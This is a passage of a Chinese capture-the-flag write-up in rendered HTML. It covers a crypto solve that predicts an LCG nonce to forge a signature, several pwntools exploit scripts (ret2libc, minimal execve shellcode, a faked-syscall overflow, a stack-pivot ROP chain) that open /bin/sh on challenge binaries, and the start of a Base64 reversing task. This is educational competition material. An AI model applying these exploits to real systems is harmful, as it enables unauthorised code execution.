operator\">=</span> Ideal<span class=\"token punctuation\">(</span>F<span class=\"token punctuation\">)</span>\n\nI <span class=\"token operator\">=</span> ideal<span class=\"token punctuation\">.</span>groebner_basis<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>I<span class=\"token punctuation\">)</span>\nn <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nb <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\nd <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>I<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>univariate_polynomial<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nlcg<span class=\"token operator\">=</span>TripleLCG<span class=\"token punctuation\">(</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>k_<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#part 2</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b' 2\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">307</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    k <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nr_l2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ns_l <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span>\n\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r = '</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'r = '</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span>\n    sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b's = '</span><span class=\"token punctuation\">)</span>\n    s<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'s = '</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span>\n\n    r_l2<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n    s_l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">,</span>s_l<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s_l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nm <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span>\nh <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nk <span class=\"token operator\">=</span> lcg<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k='</span><span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span>\ninv_r<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>r_l2<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>s_l<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>k<span class=\"token operator\">%</span>q<span class=\"token operator\">-</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_r<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> q\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"------------------------------------------\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#part 3</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'] '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span>\n\nend_m<span class=\"token operator\">=</span><span class=\"token string\">b'b'</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'e: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>end_m<span class=\"token punctuation\">)</span>\n\nend_h <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>sha256<span class=\"token punctuation\">(</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nr_ <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>q\ns_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>end_h<span class=\"token operator\">+</span>x<span class=\"token operator\">*</span>r_<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>q\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r_<span class=\"token punctuation\">,</span>s_<span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'r: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>r_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b's: '</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>recvlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1744633170180-60.png\" alt=\"img\"></p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h3><p>栈溢出，打ret2libc。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc.so.6\"</span><span class=\"token punctuation\">)</span>\n\nplt<span class=\"token operator\">=</span><span class=\"token number\">0x0401060</span>\ngot<span class=\"token operator\">=</span><span class=\"token number\">0x0404018</span>\nrdi<span class=\"token operator\">=</span><span class=\"token number\">0x0401176</span>\nstart<span class=\"token operator\">=</span><span class=\"token number\">0x0401090</span>\nret<span class=\"token operator\">=</span><span class=\"token number\">0x040101a</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">120</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name.\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">120</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name.\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h3><p>Shellcode 限制0x12 大小，不能在mmap可执行区域二次写。</p>\n<p>所有寄存器都被清空了，除了rdi为mmap可执行区域。</p>\n<p>改eax成execve系统调用，之后再加rdi到写入&#x2F;bin&#x2F;sh的偏移，最后syscall去拿shell。</p>\n<p>eax省2字节</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">\"amd64\"</span>\n\nio <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\n\nsc<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''\nmov eax, 0x3b\nadd rdi, 0xb\nsyscall\n'''</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"/bin/sh\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h3><p>第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。</p>\n<p><img src=\"/images/1744633170177-2.png\" alt=\"img\"></p>\n<p>sub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。</p>\n<p><img src=\"/images/1744633170177-3.png\" alt=\"img\"></p>\n<p>第一次写可以溢出到这些位置来改变syscall，伪造成execve(“&#x2F;bin&#x2F;sh”, 0, 0)。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">64</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x3b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0404108</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"overflow\"><a href=\"#overflow\" class=\"headerlink\" title=\"overflow\"></a>overflow</h3><p>x86 静态编译，有栈溢出。</p>\n<p><img src=\"/images/1744633170177-4.png\" alt=\"img\"></p>\n<p>返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nio<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n\neax<span class=\"token operator\">=</span><span class=\"token number\">0x080b470a</span>\nebx<span class=\"token operator\">=</span><span class=\"token number\">0x08049022</span>\necx<span class=\"token operator\">=</span><span class=\"token number\">0x08049802</span>\nedx<span class=\"token operator\">=</span><span class=\"token number\">0x08060bd1</span>\n\nrop<span class=\"token operator\">=</span>p32<span class=\"token punctuation\">(</span>eax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>ebx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x80ef344</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>ecx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>edx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x08049c6a</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span><span class=\"token string\">b\"/bin/sh\\0\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x080EF320</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>\nio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"right?\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h3><p>Base64变种加密</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">_BYTE <span class=\"token operator\">*</span>__fastcall <span class=\"token function\">sub_7FF7DC6C10E0</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span>\n  __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbp</span>\n  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi</span>\n  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r14</span>\n  size_t v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rcx</span>\n  _BYTE <span class=\"token operator\">*</span>v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r8</span>\n  __int64 v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// r9</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span>\n  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v16<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edi</span>\n  __int64 v19<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdx</span>\n  <span class=\"token keyword\">int</span> v20<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v21<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v22<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v23<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span>\n  <span class=\"token keyword\">int</span> v24<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">int</span> v25<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">int</span> v26<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v27<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ecx</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v28<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n  <span class=\"token keyword\">char</span> v30<span class=\"token punctuation\">[</span><span class=\"token number\">80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-68h] BYREF</span>\n  <span class=\"token keyword\">int</span> v31<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+90h] [rbp+8h]</span>\n\n  v2 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>v30<span class=\"token punctuation\">,</span> <span class=\"token string\">\"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">do</span>\n    <span class=\"token operator\">++</span>v2<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  v4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n  